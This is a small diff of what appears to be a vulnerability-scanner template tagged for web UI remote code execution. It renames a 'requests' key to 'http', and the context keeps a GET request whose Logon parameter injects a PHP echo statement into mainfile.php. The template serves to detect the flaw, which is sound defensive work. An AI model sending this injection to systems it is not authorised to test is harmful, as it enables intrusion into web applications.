@@ -8,7 +8,7 @@ info:
   tags: webui,rce
 
 
-requests:
+http:
   - method: GET
     path:
       - '{{BaseURL}}/mainfile.php?username=test&password=testpoc&_login=1&Logon=%27%3Becho%20md5(TestPoc)%3B%27'
